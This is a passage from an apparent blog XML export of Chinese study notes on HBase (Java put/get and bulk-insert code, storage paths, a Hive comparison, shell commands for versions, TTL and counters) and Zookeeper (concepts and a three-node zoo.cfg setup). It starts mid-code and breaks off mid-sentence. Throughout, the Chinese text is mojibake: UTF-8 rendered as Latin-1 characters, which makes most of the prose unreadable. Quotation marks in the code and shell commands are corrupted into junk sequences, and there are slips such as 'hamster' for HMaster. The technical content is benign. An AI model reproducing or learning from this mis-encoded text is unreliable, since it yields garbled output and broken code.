ConnectionFactory.createConnection(conf);// é€šè¿‡è¿æ¥æŸ¥è¯¢ TableName å¯¹è±¡TableName tname = TableName.valueOf(â€œns1:t1â€);// è·å¾— tableå¯¹è±¡Table table = conn.getTable(tname);// é€šè¿‡bytes å·¥å…·ç±»è½¬åŒ–å­—ç¬¦ä¸²ä¸ºå­—èŠ‚æ•°ç»„byte[] bytes = Bytes.toBytes(â€œrow3â€);// åˆ›å»º put å¯¹è±¡, ä¼ å…¥è¡Œå·Put put = new Put(bytes);// åˆ›å»º åˆ—æ—, åˆ—, value çš„ byte æ•°æ®byte[] f1 = Bytes.toBytes(â€œf1â€);byte[] id = Bytes.toBytes(â€œidâ€);byte[] value = Bytes.toBytes(188);put.addColumn(f1, id, value);// table put æ•°æ®table.put(put);//============================// getbyte[] rowid = Bytes.toBytes(â€œrow3â€);Get get = new Get(rowid);// å¾—åˆ° resResult res = table.get(get); // ä» res ä¸­å–å‡º valuebyte[] idvalue = res.getValue(Bytes.toBytes(â€œf1â€),Bytes.toBytes(â€œidâ€));System.out.println(Bytes.toInt(idvalue));}} HBase å†™å…¥è¿‡ç¨‹ &amp; å­˜å‚¨è·¯å¾„ WALwrite ahead log,å†™å‰æ—¥å¿—ã€‚ HDFS ä¸Šå­˜å‚¨è·¯å¾„è¯¦è§£ http://cs1:50070/explorer.html#/hbase/data/ns1/t1/97eada11d196f1e134c41e859d338e07/f1/fsfsfgwgfsgfrgfdg dataå­˜å‚¨æ•°æ®çš„ç›®å½• ns1namespace åç§° t1è¡¨å 97eada11d196f1e134c41e859d338e07region çš„ç¼–å· f1åˆ—æ— fsfsfgwgfsgfrgfdgHFile: åˆ—æ—å­˜å‚¨çš„æ–‡ä»¶, æ¯ä¸€ä¸ª hfile æ–‡ä»¶å¯¹åº”çš„æ˜¯ä¸€ä¸ªåˆ—æ— meta æ•°æ®è·¯å¾„ http://cs1:50070/explorer.html#/hbase/data/hbase/meta/1588230740/info HBase å’Œ Hive çš„æ¯”è¾ƒ ç›¸åŒç‚¹ HBase å’Œ Hive éƒ½æ˜¯æ¶æ„åœ¨ Hadoop ä¹‹ä¸Šï¼Œç”¨ HDFS åšåº•å±‚çš„æ•°æ®å­˜å‚¨ï¼Œç”¨ MapReduce åš æ•°æ®è®¡ç®— ä¸åŒç‚¹ è§£å†³çš„é—®é¢˜ä¸åŒ Hive æ˜¯å»ºç«‹åœ¨ Hadoop ä¹‹ä¸Šä¸ºäº†é™ä½ MapReduce ç¼–ç¨‹å¤æ‚åº¦çš„ ETL å·¥å…·ã€‚ HBase æ˜¯ä¸ºäº†å¼¥è¡¥ Hadoop å¯¹å®æ—¶æ“ä½œçš„ç¼ºé™· è¡¨çš„æ¶æ„ä¸åŒ Hive è¡¨æ˜¯çº¯é€»è¾‘è¡¨ï¼Œå› ä¸º Hive çš„æœ¬èº«å¹¶ä¸èƒ½åšæ•°æ®å­˜å‚¨å’Œè®¡ç®—ï¼Œè€Œæ˜¯å®Œå…¨ä¾èµ– Hadoop HBase æ˜¯ç‰©ç†è¡¨ï¼Œæä¾›äº†ä¸€å¼ è¶…å¤§çš„å†…å­˜ Hash è¡¨æ¥å­˜å‚¨ç´¢å¼•ï¼Œæ–¹ä¾¿æŸ¥è¯¢ å®šä½ &amp; è®¿é—®æœºåˆ¶ä¸åŒ Hive æ˜¯æ•°æ®ä»“åº“å·¥å…·ï¼Œéœ€è¦å…¨è¡¨æ‰«æï¼Œå°±ç”¨ Hiveï¼Œå› ä¸º Hive æ˜¯æ–‡ä»¶å­˜å‚¨ HBase æ˜¯æ•°æ®åº“ï¼Œéœ€è¦ç´¢å¼•è®¿é—®ï¼Œåˆ™ç”¨ HBaseï¼Œå› ä¸º HBase æ˜¯é¢å‘åˆ—çš„ NoSQL æ•°æ®åº“ å­˜å‚¨æ¨¡å¼ä¸åŒ Hive è¡¨ä¸­å­˜å…¥æ•°æ®(æ–‡ä»¶)æ—¶ä¸åšæ ¡éªŒï¼Œå±äºè¯»æ¨¡å¼å­˜å‚¨ç³»ç»Ÿ HBase è¡¨æ’å…¥æ•°æ®æ—¶ï¼Œä¼šå’Œ RDBMS ä¸€æ ·åš Schema æ ¡éªŒï¼Œæ‰€ä»¥å±äºå†™æ¨¡å¼å­˜å‚¨ç³»ç»Ÿ æ˜¯å¦å®æ—¶å¤„ç†(å¤„ç†æ•ˆç‡)ä¸åŒ Hive ä¸æ”¯æŒå•è¡Œè®°å½•æ“ä½œï¼Œæ•°æ®å¤„ç†ä¾é  MapReduceï¼Œæ“ä½œå»¶æ—¶é«˜ HBase æ”¯æŒå•è¡Œè®°å½•çš„ CRUDï¼Œå¹¶ä¸”æ˜¯å®æ—¶å¤„ç†ï¼Œæ•ˆç‡æ¯” Hive é«˜å¾—å¤š HBaseåœ¨ HDFS ä¸Šçš„å­˜å‚¨è·¯å¾„ ç›¸åŒåˆ—æ—çš„æ•°æ®å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚ [è¡¨æ•°æ®çš„å­˜å‚¨ç›®å½•ç»“æ„æ„æˆ] hdfs://cs1:8020/hbase/data/${åå­—ç©ºé—´}/${è¡¨å}/${åŒºåŸŸåç§°}/${åˆ—æ—åç§°}/${æ–‡ä»¶å} [WALç›®å½•ç»“æ„æ„æˆ] hdfs://cs1:8020/hbase/WALs/${åŒºåŸŸæœåŠ¡å™¨åç§°,ç«¯å£å·,æ—¶é—´æˆ³}/ Client ç«¯ ä¸ HBase äº¤äº’è¿‡ç¨‹ HBase ç®€å•é›†ç¾¤ç»“æ„ region:æ˜¯ hbase ä¸­å¯¹è¡¨è¿›è¡Œåˆ‡å‰²çš„å•å…ƒï¼Œç”± regionserver è´Ÿè´£ç®¡ç† region åˆ†è£‚æ˜¯é€»è¾‘æ¦‚å¿µ?? :TODO hamster:hbase çš„ä¸»èŠ‚ç‚¹ï¼Œè´Ÿè´£æ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€æ„ŸçŸ¥ï¼Œè´Ÿè½½åˆ†é…ã€è´Ÿè´£ç”¨æˆ·è¡¨çš„å…ƒæ•°æ®(schema)ç®¡ç†(å¯ä»¥é…ç½®å¤šä¸ªç”¨æ¥å®ç° HA),hmaster è´Ÿè½½å‹åŠ›ç›¸å¯¹äº hdfs çš„ namenode ä¼šå°å¾ˆå¤š regionserver:hbase ä¸­çœŸæ­£è´Ÿè´£ç®¡ç† region çš„æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯è´Ÿè´£ä¸ºå®¢æˆ·ç«¯è¿›è¡Œè¡¨æ•°æ®è¯»å†™ çš„æœåŠ¡å™¨æ¯ä¸€å° regionserver ä¼šç®¡ç†å¾ˆå¤šçš„ regionï¼ŒåŒä¸€ä¸ª regionserver ä¸Šé¢ç®¡ç†çš„æ‰€æœ‰çš„ region ä¸å±äºåŒä¸€å¼ è¡¨ zookeeper:æ•´ä¸ª hbase ä¸­çš„ä¸»ä»èŠ‚ç‚¹åè°ƒï¼Œä¸»èŠ‚ç‚¹ä¹‹é—´çš„é€‰ä¸¾ï¼Œé›†ç¾¤èŠ‚ç‚¹ä¹‹é—´çš„ä¸Šä¸‹çº¿æ„Ÿ çŸ¥â€â€éƒ½æ˜¯é€šè¿‡ zookeeper æ¥å®ç° HDFS:ç”¨æ¥å­˜å‚¨ hbase çš„ç³»ç»Ÿæ–‡ä»¶ï¼Œæˆ–è€…è¡¨çš„ region Hbase é¡¶å±‚ç»“æ„å›¾ 0.hbaseé›†ç¾¤å¯åŠ¨æ—¶ï¼Œmasterè´Ÿè´£åˆ†é…åŒºåŸŸåˆ°æŒ‡å®šåŒºåŸŸæœåŠ¡å™¨ã€‚ 1.è”ç³»zkï¼Œæ‰¾å‡ºmetaè¡¨æ‰€åœ¨rs(regionserver)/hbase/meta-region-server 2.å®šä½row key,æ‰¾åˆ°å¯¹åº”region server 3.ç¼“å­˜ä¿¡æ¯åœ¨æœ¬åœ°ã€‚ 4.è”ç³»RegionServer 5.HRegionServerè´Ÿè´£open HRegionå¯¹è±¡ï¼Œä¸ºæ¯ä¸ªåˆ—æ—åˆ›å»ºStoreå¯¹è±¡ï¼ŒStoreåŒ…å«å¤šä¸ªStoreFileå®ä¾‹ï¼Œä»–ä»¬æ˜¯å¯¹HFileçš„è½»é‡çº§å°è£…ã€‚æ¯ä¸ªStoreè¿˜å¯¹åº”äº†ä¸€ä¸ªMemStoreï¼Œç”¨äºå†…å­˜å­˜å‚¨æ•°æ®ã€‚ ç™¾ä¸‡æ•°æ®æ‰¹é‡æ’å…¥ ä»£ç long start = System.currentTimeMillis() ;Configuration conf = HBaseConfiguration.create();Connection conn = ConnectionFactory.createConnection(conf);TableName tname = TableName.valueOf(â€œns1:t1â€);HTable table = (HTable)conn.getTable(tname);//ä¸è¦è‡ªåŠ¨æ¸…ç†ç¼“å†²åŒºtable.setAutoFlush(false);for(int i = 4 ; i &lt; 1000000 ; i ++){Put put = new Put(Bytes.toBytes(&quot;row&quot; + i)) ; //å…³é—­å†™å‰æ—¥å¿— put.setWriteToWAL(false); put.addColumn(Bytes.toBytes(&quot;f1&quot;),Bytes.toBytes(&quot;id&quot;),Bytes.toBytes(i)); put.addColumn(Bytes.toBytes(&quot;f1&quot;),Bytes.toBytes(&quot;name&quot;),Bytes.toBytes(&quot;tom&quot; + i)); put.addColumn(Bytes.toBytes(&quot;f1&quot;),Bytes.toBytes(&quot;age&quot;),Bytes.toBytes(i % 100)); table.put(put); if(i % 2000 == 0){ table.flushCommits(); } }//table.flushCommits();System.out.println(System.currentTimeMillis() - start ); HBase åˆ‡å‰²æ–‡ä»¶ é»˜è®¤10G è¿›è¡Œåˆ‡å‰² hbase.hregion.max.filesize 10737418240 hbase-default.xml HBase åˆå¹¶æ–‡ä»¶ merge_region â€˜1f4609ba4e2a9440aedde5d0e7123722â€™,â€™48277c27196a5c6e30d5ae679e9ec4f0â€™merge â€˜å‰ä¸€ä¸ªåŒºåŸŸçš„ encodedâ€™ , â€˜åä¸€ä¸ªåŒºåŸŸçš„ encodedâ€™ HBase æ‰‹åŠ¨ç§»åŠ¨æ–‡ä»¶ hbase(main):034:0&gt; move â€˜8658ac9ea01f80c2cca32693397a1e70â€™,â€™cs3,16020,1529980599903â€™å‰é¢æ˜¯ encoded region name , åé¢æ˜¯æœåŠ¡å™¨å é¢„å…ˆåˆ‡å‰² åˆ›å»ºè¡¨æ—¶, é¢„å…ˆå¯¹è¡¨è¿›è¡Œåˆ‡å‰² åˆ‡å‰²çº¿æ˜¯ rowkeycreate â€˜ns1:t2â€™,â€™f1â€™,SPLITS=&gt;[â€˜row300â€™, â€˜row600â€™] åˆ›å»ºé¢„å…ˆåˆ‡å‰²è¡¨ä¹‹å, å­˜çš„å€¼å°±ä¼šåˆ°å¯¹åº”çš„åŒºåŸŸä¸­å» æ³¨æ„: put ä¸€æ¬¡å°±æ˜¯ä¸€æ¡æ•°æ® æŒ‡å®šç‰ˆæœ¬æ•°çš„é—®é¢˜ åˆ›å»ºè¡¨æ—¶æŒ‡å®šåˆ—æ—çš„ç‰ˆæœ¬æ•°,è¯¥åˆ—æ—çš„æ‰€æœ‰åˆ—éƒ½å…·æœ‰ç›¸åŒæ•°é‡ç‰ˆæœ¬ åˆ›å»ºè¡¨æ—¶ï¼ŒæŒ‡å®šåˆ—æ—çš„ç‰ˆæœ¬æ•°ã€‚$hbase&gt;create â€˜ns1:t3â€™,{NAME=&gt;â€™f1â€™,VERSIONS=&gt;3} å¦‚æœåˆ›å»ºè¡¨çš„æ—¶å€™åˆ›çš„æ˜¯3ä¸ªç‰ˆæœ¬, æŸ¥4ä¸ªç‰ˆæœ¬, æ­¤æ—¶æœ€å¤šä¹Ÿå°±æ˜¾ç¤º3ä¸ª$hbase&gt;get â€˜ns1:t3â€™,â€™row1â€™,{COLUMN=&gt;â€™f1â€™,VERSIONS=&gt;4}COLUMN CELL f1:name timestamp=1530019546709, value=tom3 f1:name timestamp=1530019542978, value=tom2 f1:name timestamp=1530019540164, value=tom1 åŸç”Ÿæ‰«æ(expert) åŸç”Ÿæ‰«æ, åŒ…å«æ ‡è®°äº†deleteçš„æ•°æ®$hbase&gt;scan â€˜ns1:t3â€™,{COLUMN=&gt;â€™f1â€™,RAW=&gt;true,VERSIONS=&gt;10}hbase(main):177:0&gt; scan â€˜ns1:t3â€™,{COLUMN=&gt;â€™f1â€™,RAW=&gt;true,VERSIONS=&gt;10}ROW COLUMN+CELL row1 column=f1:name, timestamp=1530019546709, value=tom3 row1 column=f1:name, timestamp=1530019542978, value=tom2 row1 column=f1:name, timestamp=1530019540164, type=DeleteColumn row1 column=f1:name, timestamp=1530019540164, value=tom1 åˆ é™¤æ•°æ®, æ ‡è®°ä¸ºåˆ é™¤, å°äºè¯¥åˆ é™¤æ—¶é—´çš„æ•°æ®éƒ½ä½œåºŸ, flush å, ç”¨ RAW ä¼¼ä¹è¿˜ä¼šä¿ç•™, ç”¨é RAW çš„æ–¹å¼æŸ¥çœ‹çš„ç”», æ­¤åˆ é™¤æ•°æ®, åŠæ—¶é—´æˆ³æ¯”è¿™ä¸ªå°çš„æ•°æ®, éƒ½ä¸ä¼šæ˜¾ç¤º. $hbase&gt;delete â€˜ns1:t3â€™,â€™row1â€™,â€™f1:nameâ€™,148989875645 è¿™é‡Œæ˜¯å¦è¦åœæ‰ hbase æœåŠ¡å†èµ·æ¥çœ‹çœ‹? TTL time to live ,å­˜æ´»æ—¶é—´ å½±å“æ‰€æœ‰çš„æ•°æ®ï¼ŒåŒ…æ‹¬æ²¡æœ‰åˆ é™¤çš„æ•°æ® è¶…è¿‡è¯¥æ—¶é—´ï¼ŒåŸç”Ÿæ‰«æä¹Ÿæ‰«ä¸åˆ°æ•°æ® åˆ›å»ºå¸¦ TTLå‚æ•°çš„è¡¨$hbase&gt;create â€˜ns1:txâ€™ , {NAME=&gt;â€™f1â€™,TTL=&gt;10,VERSIONS=&gt;10} KEEP_DELETED_CELLS åˆ é™¤keyä¹‹åï¼Œæ•°æ®æ˜¯å¦è¿˜ä¿ç•™, æœªæµ‹è¯•$hbase&gt;create â€˜ns1:txâ€™ , {NAME=&gt;â€™f1â€™,TTL=&gt;10,VERSIONS,KEEP_DELETED_CELLS=&gt;true} TTL çš„ä¼˜å…ˆçº§é«˜äº KEEP_DELETED_CELLS, å¦‚æœè®¾ç½®äº† TTL, æ—¶é—´ä¸€åˆ°å°±æ²¡äº†, ç”¨ RAW ä¹Ÿæ‰¾ä¸å›æ¥ ç¼“å­˜ å’Œ æ‰¹å¤„ç† å¼€å¯æœåŠ¡å™¨ç«¯æ‰«æå™¨ç¼“å­˜ è¡¨å±‚é¢(å…¨å±€), è²Œä¼¼æ˜¯é»˜è®¤çš„? å†çœ‹çœ‹ä¹¦ä¸Šè¯´çš„ hbase.client.scanner.caching 2147483647 hbase-default.xml æ“ä½œå±‚é¢ æ³¨æ„: è²Œä¼¼JavaAPI ä¸­é»˜è®¤æ˜¯æ²¡æœ‰è®¾ç½® caching çš„ è®¾ç½®æ–¹å¼scan.setCaching(10); æ“ä½œæ—¶é—´cache row nums : 1000 //632cache row nums : 5000 //423cache row nums : 1 //7359 æ‰«æå™¨ç¼“å­˜æ˜¯ é¢å‘è¡Œçº§åˆ«çš„ æ‰¹é‡æ‰«ææ˜¯ é¢å‘åˆ—çº§åˆ«çš„ æ§åˆ¶æ¯æ¬¡next()æœåŠ¡å™¨ç«¯è¿”å›çš„åˆ—çš„ä¸ªæ•°ã€‚ scan.setBatch(5);æ¯æ¬¡nextè¿”å›5åˆ—ã€‚ è¿‡æ»¤å™¨ å›¾ç¤º ä»£ç  https://github.com/airpoet/bigdata/blob/master/HBaseDemo/src/test/java/com/rox/text/TestCRUD.java è®¡æ•°å™¨ shell å®ç° $hbase&gt;incr â€˜ns1:t8â€™,â€™row1â€™,â€™f1:clickâ€™,1åé¢å¯ä»¥è·Ÿä»»æ„æ•°å­—, æ­£è´Ÿ,0éƒ½å¯ä»¥ $hbase&gt;get_counter â€˜ns1:t8â€™,â€™row1â€™,â€™f1:clickâ€™è·å–è®¡æ•°å™¨ Java ä»£ç  https://github.com/airpoet/bigdata/blob/master/HBaseDemo/src/test/java/com/rox/text/TestCRUD.java åå¤„ç†å™¨ coprocessor :TODO æœ‰ç©ºå†çœ‹ æ‰¹å¤„ç†çš„ï¼Œç­‰ä»·äºå­˜å‚¨è¿‡ç¨‹æˆ–è€…è§¦å‘å™¨ Observer RegionObserver //RegionServeråŒºåŸŸè§‚å¯Ÿè€… MasterObserver //MasterèŠ‚ç‚¹ã€‚ WAlObserver // Endpoint ç»ˆç«¯,ç±»ä¼¼äºå­˜å‚¨è¿‡ç¨‹ã€‚ HBase &amp; Mapreduce æ•´åˆ è¿è¡Œå®˜æ–¹æ¡ˆä¾‹ [ap@cs1]~/apps/hbase% export HBASE_HOME=/home/ap/apps/hbase [ap@cs1]~/apps/hbase% export HADOOP_HOME=/home/ap/apps/hadoop [ap@cs1]~/apps/hbase% export HADOOP_CLASSPATH=${HBASE_HOME}/bin/hbase mapredcp ä½¿ç”¨ MapReduceå¯¼å…¥æœ¬åœ°æ•°æ®åˆ°Hbase apps/hadoop/bin/yarn jar apps/hbase/lib/hbase-server-1.2.6.1.jar importtsv \ -Dimporttsv.columns=HBASE_ROW_KEY,info:name,info:color fruit \ hdfs://cs1:8020/input_fruitè¿™æ˜¯ namenode çš„ RPC åœ°å€ HBase &amp; Hive æ•´åˆ1.ç¯å¢ƒé…ç½® 12345export HBASE_HOME=/home/ap/apps/hbaseexport HADOOP_HOME=/home/ap/apps/hadoopexport HADOOP_CLASSPATH=`$&#123;HBASE_HOME&#125;/bin/hbase mapredcp` å‰©ä¸‹çš„hbaseçŸ¥è¯†ç‚¹ æœ‰ç©ºå†è¡¥å……]]></content>
      <categories>
        <category>Hadoop</category>
        <category>HBase</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>HBase</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Zookeeper]]></title>
    <url>%2F2018%2F06%2F23%2FHadoop%2F4-Zookeeper%2Fi-Zookeeper%2F</url>
    <content type="text"><![CDATA[1.Zookeeper çš„å®‰è£…&amp;æ¦‚è¿°1.1. Zookeeper ç®€ä»‹Zookeeperæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼çš„ï¼Œä¸ºåˆ†å¸ƒå¼åº”ç”¨æä¾›åè°ƒæœåŠ¡çš„Apacheé¡¹ç›®ã€‚ zkæä¾›çš„æœåŠ¡ Naming service //æŒ‰åç§°åŒºåˆ†é›†ç¾¤ä¸­çš„èŠ‚ç‚¹. Configuration management //å¯¹åŠ å…¥èŠ‚ç‚¹çš„æœ€æ–°åŒ–å¤„ç†ã€‚ Cluster management //å®æ—¶æ„ŸçŸ¥é›†ç¾¤ä¸­èŠ‚ç‚¹çš„å¢å‡. Leader election //leaderé€‰ä¸¾ Locking and synchronization service //ä¿®æ”¹æ—¶é”å®šæ•°æ®ï¼Œå®ç°å®¹ç¾. Highly reliable data registry //èŠ‚ç‚¹å®•æœºæ•°æ®ä¹Ÿæ˜¯å¯ç”¨çš„ã€‚ 1.2. ZK çš„å·¥ä½œæœºåˆ¶ 1.4. ZK æ¶æ„ 1.4.1 åè¯è§£é‡Š 1.Client â€‹ ä»serverè·å–ä¿¡æ¯ï¼Œå‘¨æœŸæ€§å‘é€æ•°æ®ç»™serverï¼Œè¡¨ç¤ºè‡ªå·±è¿˜æ´»ç€ã€‚ â€‹ clientè¿æ¥æ—¶ï¼Œserverå›ä¼ ackä¿¡æ¯ã€‚ â€‹ å¦‚æœclientæ²¡æœ‰æ”¶åˆ°reponseï¼Œè‡ªåŠ¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªserver. â€‹ 2.Server â€‹ zké›†ç¾¤ä¸­çš„ä¸€å‘˜ï¼Œå‘clientæä¾›æ‰€æœ‰serviceï¼Œå›ä¼ ackä¿¡æ¯ç»™clientï¼Œè¡¨ç¤ºè‡ªå·±è¿˜æ´»ç€ã€‚ â€‹ 3.ensemble â€‹ ä¸€ç»„æœåŠ¡å™¨ã€‚ â€‹ æœ€å°èŠ‚ç‚¹æ•°æ˜¯3. â€‹ 4.Leader â€‹ å¦‚æœè¿æ¥çš„èŠ‚ç‚¹å¤±è´¥ï¼Œè‡ªå®šæ¢å¤ï¼ŒzkæœåŠ¡å¯åŠ¨æ—¶ï¼Œå®Œæˆleaderé€‰ä¸¾ã€‚ â€‹ 5.Follower â€‹ è¿½å¯»leaderæŒ‡ä»¤çš„èŠ‚ç‚¹ã€‚ 1.4.2 æ•´ä½“è§£é‡Š 1ï¼‰Zookeeperï¼šä¸€ä¸ªé¢†å¯¼è€…ï¼ˆleaderï¼‰ï¼Œå¤šä¸ªè·Ÿéšè€…ï¼ˆfollowerï¼‰ç»„æˆçš„é›†ç¾¤ã€‚ 2ï¼‰Leaderè´Ÿè´£è¿›è¡ŒæŠ•ç¥¨çš„å‘èµ·å’Œå†³è®®ï¼Œæ›´æ–°ç³»ç»ŸçŠ¶æ€ 3ï¼‰Followerç”¨äºæ¥æ”¶å®¢æˆ·è¯·æ±‚å¹¶å‘å®¢æˆ·ç«¯è¿”å›ç»“æœï¼Œåœ¨é€‰ä¸¾Leaderè¿‡ç¨‹ä¸­å‚ä¸æŠ•ç¥¨ 4ï¼‰é›†ç¾¤ä¸­åªè¦æœ‰åŠæ•°ä»¥ä¸ŠèŠ‚ç‚¹å­˜æ´»ï¼ŒZookeeperé›†ç¾¤å°±èƒ½æ­£å¸¸æœåŠ¡ã€‚ 5ï¼‰å…¨å±€æ•°æ®ä¸€è‡´ï¼šæ¯ä¸ªserverä¿å­˜ä¸€ä»½ç›¸åŒçš„æ•°æ®å‰¯æœ¬ï¼Œclientæ— è®ºè¿æ¥åˆ°å“ªä¸ªserverï¼Œæ•°æ®éƒ½æ˜¯ä¸€è‡´çš„ã€‚ 6ï¼‰æ›´æ–°è¯·æ±‚é¡ºåºè¿›è¡Œï¼Œæ¥è‡ªåŒä¸€ä¸ªclientçš„æ›´æ–°è¯·æ±‚æŒ‰å…¶å‘é€é¡ºåºä¾æ¬¡æ‰§è¡Œã€‚ 7ï¼‰æ•°æ®æ›´æ–°åŸå­æ€§ï¼Œä¸€æ¬¡æ•°æ®æ›´æ–°è¦ä¹ˆæˆåŠŸï¼Œè¦ä¹ˆå¤±è´¥ã€‚ 8ï¼‰å®æ—¶æ€§ï¼Œåœ¨ä¸€å®šæ—¶é—´èŒƒå›´å†…ï¼Œclientèƒ½è¯»åˆ°æœ€æ–°æ•°æ®ã€‚ 1.5. znode ZooKeeperæ•°æ®æ¨¡å‹çš„ç»“æ„ä¸Unixæ–‡ä»¶ç³»ç»Ÿå¾ˆç±»ä¼¼ï¼Œæ•´ä½“ä¸Šå¯ä»¥çœ‹ä½œæ˜¯ä¸€æ£µæ ‘ï¼Œæ¯ä¸ªèŠ‚ç‚¹ç§°åšä¸€ä¸ªZNodeã€‚æ¯ä¸€ä¸ªZNodeé»˜è®¤èƒ½å¤Ÿå­˜å‚¨1MBçš„æ•°æ®ï¼Œæ¯ä¸ªZNodeéƒ½å¯ä»¥é€šè¿‡å…¶è·¯å¾„å”¯ä¸€æ ‡è¯† zkä¸­çš„èŠ‚ç‚¹ï¼Œç»´æŠ¤äº†statï¼Œç”±Version number, Action control list (ACL), Timestamp,Data length.æ„æˆ. data version //æ•°æ®å†™å…¥çš„è¿‡ç¨‹å˜åŒ– ACL //action control list, 1.6. èŠ‚ç‚¹ç±»å‹â€‹ 1.æŒä¹…èŠ‚ç‚¹ â€‹ clientç»“æŸï¼Œè¿˜å­˜åœ¨ã€‚ â€‹ 2.ä¸´æ—¶èŠ‚ç‚¹ â€‹ åœ¨clientæ´»åŠ¨æ—¶æœ‰æ•ˆï¼Œæ–­å¼€è‡ªåŠ¨åˆ é™¤ã€‚ä¸´æ—¶èŠ‚ç‚¹ä¸èƒ½æœ‰å­èŠ‚ç‚¹ã€‚ â€‹ leaderæ¨é€‰æ—¶ä½¿ç”¨ã€‚ â€‹ 3.åºåˆ—èŠ‚ç‚¹ â€‹ åœ¨èŠ‚ç‚¹åä¹‹åé™„åŠ 10ä¸ªæ•°å­—ï¼Œä¸»è¦ç”¨äºåŒæ­¥å’Œé”. 1.7. Sessionâ€‹ Sessionä¸­çš„è¯·æ±‚ä»¥FIFOæ‰§è¡Œï¼Œä¸€æ—¦clientè¿æ¥åˆ°serverï¼Œsessionå°±å»ºç«‹äº†ã€‚sessionidåˆ†é…client. â€‹ clientä»¥å›ºå®šé—´éš”å‘serverå‘é€å¿ƒè·³ï¼Œè¡¨ç¤ºsessionæ˜¯validçš„ï¼Œzké›†ç¾¤å¦‚æœåœ¨è¶…æ—¶æ—¶å€™ï¼Œæ²¡æœ‰æ”¶åˆ°å¿ƒè·³ï¼Œ â€‹ åˆ¤å®šä¸ºclientæŒ‚äº†ï¼Œä¸æ­¤åŒæ—¶ï¼Œä¸´æ—¶èŠ‚ç‚¹è¢«åˆ é™¤ã€‚ 1.8. Watchesâ€‹ è§‚å¯Ÿã€‚ â€‹ clientèƒ½å¤Ÿé€šè¿‡watchæœºåˆ¶åœ¨æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶æ”¶åˆ°é€šçŸ¥ã€‚ â€‹ clientå¯ä»¥åœ¨read èŠ‚ç‚¹æ—¶è®¾ç½®è§‚å¯Ÿè€…ã€‚watchæœºåˆ¶ä¼šå‘é€é€šçŸ¥ç»™æ³¨å†Œçš„å®¢æˆ·ç«¯ã€‚ â€‹ è§‚å¯Ÿæ¨¡å¼åªè§¦å‘ä¸€æ¬¡ã€‚ â€‹ sessionè¿‡æœŸï¼Œwatchæœºåˆ¶åˆ é™¤äº†ã€‚ 1.9. zkå·¥ä½œæµç¨‹â€‹ zké›†ç¾¤å¯åŠ¨åï¼Œclientè¿æ¥åˆ°å…¶ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹å¯ä»¥æ˜¯leaderï¼Œä¹Ÿå¯ä»¥æ˜¯followerã€‚ â€‹ è¿é€šåï¼Œnodeåˆ†é…ä¸€ä¸ªidç»™clientï¼Œå‘é€ackä¿¡æ¯ç»™clientã€‚ â€‹ å¦‚æœå®¢æˆ·ç«¯æ²¡æœ‰æ”¶åˆ°ackï¼Œè¿æ¥åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ã€‚ â€‹ clientå‘¨æœŸæ€§å‘é€å¿ƒè·³ä¿¡æ¯ç»™èŠ‚ç‚¹ä¿è¯è¿æ¥ä¸ä¼šä¸¢å¤±ã€‚ â€‹ å¦‚æœclientè¯»å–æ•°æ®ï¼Œå‘é€è¯·æ±‚ç»™nodeï¼Œnodeè¯»å–è‡ªå·±æ•°æ®åº“ï¼Œè¿”å›èŠ‚ç‚¹æ•°æ®ç»™client. â€‹ å¦‚æœclientæƒ³è¦åœ¨ zk ä¸­å­˜å‚¨æ•°æ®ï¼Œå°†è·¯å¾„å’Œæ•°æ®å‘é€ç»™serverï¼Œserverè½¬å‘ç»™leaderã€‚ â€‹ leaderå†è¡¥å‘è¯·æ±‚ç»™æ‰€æœ‰followerã€‚åªæœ‰å¤§å¤šæ•°(è¶…è¿‡åŠæ•°)èŠ‚ç‚¹æˆåŠŸå“åº”ï¼Œåˆ™ â€‹ å†™æ“ä½œæˆåŠŸã€‚ 1.10 zk åº”ç”¨åœºæ™¯1.10.1 ç»Ÿä¸€å‘½åæœåŠ¡ 1.10.2 ç»Ÿä¸€é…ç®¡ç† 1.10.3 ç»Ÿä¸€é›†ç¾¤ç®¡ç† 1.10.4 æœåŠ¡å™¨åŠ¨æ€ä¸Šä¸‹çº¿ 1.10.5 è½¯è´Ÿè½½å‡è¡¡ 2.Zookeeper å®Œå…¨åˆ†å¸ƒå¼çš„å®‰è£…&amp;åŸºæœ¬ä½¿ç”¨2.1 å®‰è£…2.1.1 é«˜å¯ç”¨å®‰è£…PS: é«˜å¯ç”¨å®‰è£…è§è¿™é‡Œ 2.2.2 å®Œå…¨åˆ†å¸ƒå¼å®‰è£…123456789101112131415161718192021222324252627282930313233341.æŒ‘é€‰3å°ä¸»æœºcs1 ~ cs32.æ¯å°æœºå™¨éƒ½å®‰è£…zk &amp; é…ç½®ç¯å¢ƒå˜é‡3.é…ç½®zké…ç½®æ–‡ä»¶cs1 ~ cs3[/home/ap/apps/zk/conf/zoo.cfg]----------tickTime=2000initLimit=10syncLimit=5dataDir=/home/ap/zookeeperclientPort=2181server.1=cs1:2888:3888server.2=cs2:2888:3888server.3=cs3:2888:3888---------4.åœ¨æ¯å°ä¸»æœºçš„/home/ap/zookeeperä¸­æ·»åŠ myid,å†…å®¹åˆ†åˆ«æ˜¯1,2,3[cs1]$&gt;echo 1 &gt; /home/ap/zookeeper/myid[cs2]$&gt;echo 2 &gt; /home/ap/zookeeper/myid[cs3]$&gt;echo 3 &gt; /home/ap/zookeeper/myid5.åœ¨cs1~cs3ä¸Š,å¯åŠ¨æœåŠ¡å™¨é›†ç¾¤ $&gt;zkServer.sh start6.æŸ¥çœ‹æ¯å°æœåŠ¡å™¨çš„çŠ¶æ€$&gt;zkServer.sh status* æ³¨æ„: å¦‚æœæœ‰3å°æœºå™¨, åªå¯åŠ¨ä¸€å°çš„è¯, ä¼šæ˜¾ç¤ºå¦‚ä¸‹, å› ä¸ºæ ¹æ®é…ç½®, æœ‰3å°æœºå™¨, æ­¤æ—¶åªæœ‰ä¸€å°å¯åŠ¨, æ²¡æœ‰è¿‡åŠæ•°, 